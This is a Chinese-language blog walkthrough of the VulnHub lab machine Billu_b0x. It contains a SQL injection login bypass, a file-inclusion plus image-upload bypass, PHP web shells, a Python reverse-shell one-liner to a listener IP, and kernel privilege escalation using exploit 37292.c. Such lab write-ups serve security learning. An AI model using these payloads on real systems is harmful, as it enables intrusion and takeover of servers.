@@ -1,0 +1,340 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>0x11-VulnHub靶机-Billu_b0x | xiaomao</title>
+<link rel="shortcut icon" href="https://xiaomaoq.github.io//favicon.ico?v=1742647247277">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaomaoq.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="0x11-VulnHub靶机-Billu_b0x | xiaomao - Atom Feed" href="https://xiaomaoq.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="环境
+靶机地址:https://download.vulnhub.com/billu/Billu_b0x.zip
+内容
+
+
+SQL注入  		 (sqlmap跑不出来 )
+
+
+文件包含                  (会将php代码 解..." />
+    <meta name="keywords" content="vulnhub,打靶" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaomaoq.github.io/">
+  <img class="avatar" src="https://xiaomaoq.github.io//images/avatar.png?v=1742647247277" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaomao
+  </h1>
+  <p class="site-description">
+    取法乎上，仅得其中<br>
+取法乎中，仅得其下
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://xiaomaoq.github.io/guan-yu" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              0x11-VulnHub靶机-Billu_b0x
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-03-14
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://xiaomaoq.github.io/SARbZmWC9/" class="post-tag">
+                  # vulnhub
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/sYnh9qvSqV/" class="post-tag">
+                  # 打靶
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="环境">环境</h1>
+<p>靶机地址:https://download.vulnhub.com/billu/Billu_b0x.zip</p>
+<h2 id="内容">内容</h2>
+<ul>
+<li>
+<p>SQL注入  		 (sqlmap跑不出来 )</p>
+</li>
+<li>
+<p>文件包含                  (会将php代码 解析 执行结果显示给我们)</p>
+</li>
+<li>
+<p>文件上传</p>
+</li>
+<li>
+<p>任意文件下载            (将php源码显示给我们 )</p>
+</li>
+<li>
+<p>内核提权</p>
+</li>
+</ul>
+<p>​</p>
+<h1 id="操作">操作</h1>
+<h2 id="信息收集">信息收集</h2>
+<p>常规的nmap 主机发现 端口扫描   开放22 80</p>
+<p>访问80发现个登录界面 上面写着   但是我用sqlmap去跑 没跑出来诶</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131449196.png" alt="image-20240313144923144" loading="lazy"></figure>
+<p>然后就是目录扫描了  扫出来的东西还挺多</p>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131450961.png" alt="image-20240313145056925" loading="lazy"></figure>
+<p>add.php 是个上传功能  但是测试了一下  上传图片也没什么变化</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131452394.png" alt="image-20240313145214361" loading="lazy"></figure>
+<p>/in是phpinfo</p>
+<p>/phpmy   是一个数据库的登录界面  弱口令也进不去</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131459114.png" alt="image-20240313145908066" loading="lazy"></figure>
+<p>/test.php     下面的提示看起来可以利用一下   试着去get请求传参发现不行  就改为post</p>
+<figure data-type="image" tabindex="5"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131503843.png" alt="image-20240313150328816" loading="lazy"></figure>
+<p>更换请求方式  (get post			 要用burp的change request method   而不是直接该抓包的内容 (你直接改 有些细节的变化 导致执行不出原本的结果 )</p>
+<figure data-type="image" tabindex="6"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131035605.png" alt="image-20240313103532586" loading="lazy"></figure>
+<p>发现用post去传参就可以</p>
+<figure data-type="image" tabindex="7"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131508600.png" alt="image-20240313150809551" loading="lazy"></figure>
+<h2 id="文件下载与文件包含">文件下载与文件包含</h2>
+<p>我用这种方式去访问 给我回显的是源码     那这应该就是<strong>任意文件下载</strong>   (加上用hackerbar去传参 下载了 )</p>
+<p>文件包含是会将页面解析出来 你可以看到phpinfo的页面 看不到php代码</p>
+<figure data-type="image" tabindex="8"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131118491.png" alt="image-20240313111810450" loading="lazy"></figure>
+<p>这个时候我们可以看到页面的源码了  知道他的功能是怎么写的  就相当于白盒绕过了</p>
+<h2 id="进入后台-思路一-源码审计">进入后台 思路一   源码审计</h2>
+<p>我们去看看那个登录界面是怎么写的</p>
+<figure data-type="image" tabindex="9"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131513470.png" alt="image-20240313151319428" loading="lazy"></figure>
+<pre><code>	尝试绕过 然后登录进去 
+	$uname=str_replace('\'','',urldecode($_POST['un']));
+	$pass=str_replace('\'','',urldecode($_POST['ps']));
+	$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
+	$result = mysqli_query($conn, $run);
+	
+	就相当于  
+$run='select * from auth where  pass='.$pass.' and uname='.$uname.'';
+</code></pre>
+<p>uname   ' or 1=1#</p>
+<p>pass     \     (为啥这个要是 \ 啊  md  不理解 )</p>
+<h2 id="进入后台-思路二-进入数据库管理界面">进入后台 思路二    进入数据库管理界面</h2>
+<p>给file继续传参 当传入c.php(dirsearch扫出来的)  发现了数据库的账号密码   通过那个数据库的登录界面登入进去 (没有我们就无法登 因为mysql默认不支持外连)</p>
+<figure data-type="image" tabindex="10"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131520214.png" alt="image-20240313152031179" loading="lazy"></figure>
+<p>进入后 发现版本了 比较低  去网上找  phpmyadmin 3.4.7后台   但是浅浅试了试 get不了shell</p>
+<p>再去翻一翻有没有什么别敏感信息  发了个账号密码   然后可以直接进入后台</p>
+<figure data-type="image" tabindex="11"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131535635.png" alt="image-20240313153500602" loading="lazy"></figure>
+<h2 id="思路三">思路三</h2>
+<p><strong>使用sql注入的一些万能密码的payload结合burp进行注入</strong></p>
+<p>因为这个过程需要用到很多的payload，直接显示找到了万能密码的payload文件</p>
+<p><strong>seclists</strong>中的sql的payload文件，<strong>/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt</strong>（对应username）</p>
+<p>burp专业版中自带的针对SQL注入的字典（对应password）</p>
+<h2 id="后台">后台</h2>
+<p>通过找到账号密码 or 万能密码进入后台了</p>
+<p>发现有个上传的点 而且与之前那个add.php  一样</p>
+<p>简单试了 绕不过</p>
+<p>但是这里面的 load 参数就很有意思 他传什么 页面就会发生变化 而且这个参数值都是在dirsearch扫描时候发现有的</p>
+<figure data-type="image" tabindex="12"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131557076.png" alt="image-20240313155748044" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131558160.png" alt="image-20240313155804125" loading="lazy"></figure>
+<p>我去传入那个in.php发现</p>
+<figure data-type="image" tabindex="14"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131600088.png" alt="image-20240313160033018" loading="lazy"></figure>
+<p>​	再去试了passwd 也给我显示出来了    确定了这个参数存在文件包含漏洞  (像文件包含 你就看不到php的源码 只可以看到解析出来的页面 <img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131601125.png" alt="image-20240313160129023" loading="lazy"></p>
+<h2 id="文件包含文件上传">文件包含+文件上传</h2>
+<p>这里我们有了文件包含漏洞    而且有上传的功能点   我们可以上传一个带🐎的合法文件  然后再去包含这个文件  由于存在文件包含漏洞 所以这个文件就会以php脚本去解析 然后🐎就生效了</p>
+<p>他会检查文件头</p>
+<figure data-type="image" tabindex="15"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131607853.png" alt="image-20240313160752768" loading="lazy"></figure>
+<p>但是看不到phpinfo的内容(因为我添加GIF89a头部的原因？)    <strong>傻逼了  (肯定不可以直接去访问 要用给参数传参去包含</strong></p>
+<figure data-type="image" tabindex="16"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131608723.png" alt="image-20240313160840693" loading="lazy"></figure>
+<p>应该这样去 <s>但是还是没看到phpinfo的页面？</s></p>
+<figure data-type="image" tabindex="17"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131630968.png" alt="image-20240313163032934" loading="lazy"></figure>
+<p>直接传🐎试试</p>
+<?php
+
+eval($_POST["pass"]);
+
+但这不能够用哥斯拉去连 因为他肯定无法png当php解析  肯定连不上 
+
+![image-20240313161320894](https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131613925.png)
+
+看看能不能执行啥命令什么的  也没显示 
+
+ ![image-20240313164449332](https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131644400.png)
+
+
+
+后面测试测试 发现我写的🐎有点问题 就是我🐎再用post传参就很尴尬 		   这样就可以执行命令而且可以回显 
+
+  <?php
+system($_GET['cmd']); ?>  // 用get 
+<figure data-type="image" tabindex="18"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131654436.png" alt="image-20240313165451371" loading="lazy"></figure>
+<p>然后可以用nc去反弹shell     先kali监听    是能够通的 但是我常规的连不了  试试 nc串联  也不行</p>
+<figure data-type="image" tabindex="19"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131701701.png" alt="image-20240313170123676" loading="lazy"></figure>
+<p>用python的可以    但是要url编码</p>
+<pre><code>export RHOST=&quot;192.168.3.120&quot;;export RPORT=9002;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;/bin/bash&quot;)'
+
+</code></pre>
+<figure data-type="image" tabindex="20"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403132128583.png" alt="" loading="lazy"></figure>
+<h2 id="提权">提权</h2>
+<p>suid sudo 都没啥</p>
+<p>uname -a  发现内核版本低</p>
+<figure data-type="image" tabindex="21"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403132142474.png" alt="image-20240313214243446" loading="lazy"></figure>
+<p><code>searchsploit 3.13.0</code></p>
+<figure data-type="image" tabindex="22"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403132145955.png" alt="image-20240313214554905" loading="lazy"></figure>
+<p>把 文件cp 到桌面  然后再wget下到目标主机</p>
+<p>再编译 <code>gcc 37292.c -o exp</code>  chmod+x exp    再运行</p>
+<figure data-type="image" tabindex="23"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403132148553.png" alt="image-20240313214846517" loading="lazy"></figure>
+<h3 id="项目">项目</h3>
+<p>用 https://github.com/carlospolop/PEASS-ng  也直接搞出了这个root的密码</p>
+<figure data-type="image" tabindex="24"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403132156560.png" alt="image-20240313215655534" loading="lazy"></figure>
+<p>也提示了可以用这类内核漏洞</p>
+<figure data-type="image" tabindex="25"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403132158001.png" alt="image-20240313215837953" loading="lazy"></figure>
+<h1 id="被忽略的点">被忽略的点</h1>
+<p>在可以看任意文件代码的时候，应该把所有的目录都跑一边，然后<strong>每一个文件都去看一看有什么</strong></p>
+<p>在这个靶机中 在phpmy目录下存在着一个文件 直接由root的密码  然后就可以直接通过ssh去连接</p>
+<p>但我压根就没想过要去扫 /phpmy</p>
+<figure data-type="image" tabindex="26"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131546411.png" alt="image-20240313154620368" loading="lazy"></figure>
+<p>直接拿到root啊</p>
+<figure data-type="image" tabindex="27"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202403131547293.png" alt="image-20240313154734259" loading="lazy"></figure>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E7%8E%AF%E5%A2%83">环境</a>
+<ul>
+<li><a href="#%E5%86%85%E5%AE%B9">内容</a></li>
+</ul>
+</li>
+<li><a href="#%E6%93%8D%E4%BD%9C">操作</a>
+<ul>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E4%B8%8E%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件下载与文件包含</a></li>
+<li><a href="#%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0-%E6%80%9D%E8%B7%AF%E4%B8%80-%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1">进入后台 思路一   源码审计</a></li>
+<li><a href="#%E8%BF%9B%E5%85%A5%E5%90%8E%E5%8F%B0-%E6%80%9D%E8%B7%AF%E4%BA%8C-%E8%BF%9B%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%95%8C%E9%9D%A2">进入后台 思路二    进入数据库管理界面</a></li>
+<li><a href="#%E6%80%9D%E8%B7%AF%E4%B8%89">思路三</a></li>
+<li><a href="#%E5%90%8E%E5%8F%B0">后台</a></li>
+<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件包含+文件上传</a></li>
+<li><a href="#%E6%8F%90%E6%9D%83">提权</a>
+<ul>
+<li><a href="#%E9%A1%B9%E7%9B%AE">项目</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E8%A2%AB%E5%BF%BD%E7%95%A5%E7%9A%84%E7%82%B9">被忽略的点</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xiaomaoq.github.io/0x10-vulnhub-hacksudo-thor/">
+              <h3 class="post-title">
+                0x10-VulnHub-hacksudo-Thor
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaomaoq.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
